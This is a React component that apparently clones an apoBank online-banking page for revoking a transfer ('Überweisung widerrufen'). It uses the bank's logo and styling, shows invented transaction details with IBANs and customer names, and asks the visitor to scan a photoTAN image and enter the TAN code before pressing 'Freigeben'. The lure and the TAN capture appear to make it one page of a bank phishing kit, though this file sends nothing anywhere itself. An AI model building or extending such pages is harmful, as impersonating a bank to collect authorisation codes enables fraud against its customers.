import { useState } from "react";
import { ChevronRight, HelpCircle } from "lucide-react";
import { useNavigate } from "react-router-dom";
import apoBankLogo from "@/assets/apobank-logo.svg";
import phototanImg from "@/assets/phototan.png";
import { Button } from "@/components/ui/button";

const WiderrufPhotoTan = () => {
  const navigate = useNavigate();
  const [tan, setTan] = useState("");

  const Field = ({ label, value }: { label: string; value: string }) => (
    <div>
      <p className="text-sm text-[#002776] mb-2 font-medium">{label}</p>
      <p className="text-sm text-foreground">{value}</p>
    </div>
  );

  return (
    <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
      <header className="w-full bg-white border-b border-border/40">
        <div className="max-w-6xl mx-auto px-4 py-3 flex items-center gap-4">
          <img src={apoBankLogo} alt="apoBank Logo" className="h-12 w-auto" />
        </div>
      </header>

      <div className="bg-[#f5f5f5] border-b border-border/40">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 py-4">
          <div className="flex items-center gap-2 text-sm text-[#002776]">
            <button onClick={() => navigate("/")} className="hover:underline">Startseite</button>
            <ChevronRight className="h-3 w-3 text-foreground/60" />
            <span className="text-foreground/70">Überweisung widerrufen</span>
          </div>
          <h1 className="mt-2 text-2xl sm:text-3xl font-normal text-[#1a1a1a]">Überweisung widerrufen</h1>
        </div>
      </div>

      <main className="flex-1 relative">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 pt-6">
        </div>

        <div className="flex items-start justify-center">
          <div className="mt-8 sm:mt-10 mb-16 w-[94%] max-w-[680px] bg-white rounded-[16px] shadow-[0_8px_30px_rgba(0,0,0,0.15)] border border-border/40 p-6 sm:p-10">
            <h2 className="text-lg sm:text-xl text-[#1a1a1a] mb-6">
              Bitte prüfen Sie die folgende Transaktion
            </h2>

            <p className="text-sm text-foreground mb-6">Zahlung widerrufen</p>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-6 mb-6">
              <Field label="Empfängerkonto" value="DE42 5003 1900 0016 4288 41" />
              <Field label="Betrag" value="5,00 EUR" />
              <Field label="Verwendungszweck" value="3543NV44/17726" />
              <Field label="Ausführungsdatum" value="17. Juli 2026" />
              <Field label="Auftraggeberkontonummer" value="25957083" />
              <Field label="IBAN des Auftraggebers" value="DE53 3006 0601 0025 9570 83" />
              <Field label="Kundenname" value="Gülnaz Kirdemir" />
              <Field label="Name des Begünstigten" value="Veronica Ariyanne" />
            </div>

            <div className="border-t border-border/60 pt-6 mb-6">
              <div className="flex flex-col sm:flex-row items-center gap-6">
                <div className="flex-1">
                  <p className="text-sm text-foreground mb-4">
                    Bitte scannen Sie die apoTAN Grafik mit der photoTAN Funktion Ihrer apoTAN App und geben Sie die TAN im Eingabefeld ein
                  </p>
                  <div className="relative">
                    <label className="absolute -top-2 left-3 bg-white px-1 text-[11px] text-[#002776]">TAN*</label>
                    <input
                      type="text"
                      value={tan}
                      onChange={(e) => setTan(e.target.value)}
                      className="w-full border-2 border-[#002776] rounded px-3 py-3 text-sm outline-none focus:ring-2 focus:ring-[#a0b0c8]"
                    />
                  </div>
                </div>
                <img src={phototanImg} alt="photoTAN Grafik" className="w-40 h-40 object-contain border border-black" />
              </div>
            </div>

            <div className="flex justify-end items-center gap-4 pt-2">
              <button
                onClick={() => navigate(-1)}
                className="text-sm text-[#002776] hover:underline px-2"
              >
                Abbrechen
              </button>
              {(() => {
                const valid = tan.length === 6 || tan.length === 8;
                return (
                  <Button
                    disabled={!valid}
                    onClick={() => navigate("/success")}
                    className={`rounded-full px-6 disabled:opacity-100 ${valid ? "bg-white text-foreground border border-border hover:bg-white" : "bg-[#e6e8eb] text-foreground/60 hover:bg-[#e6e8eb]"}`}
                  >
                    Freigeben
                  </Button>
                );
              })()}
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default WiderrufPhotoTan;
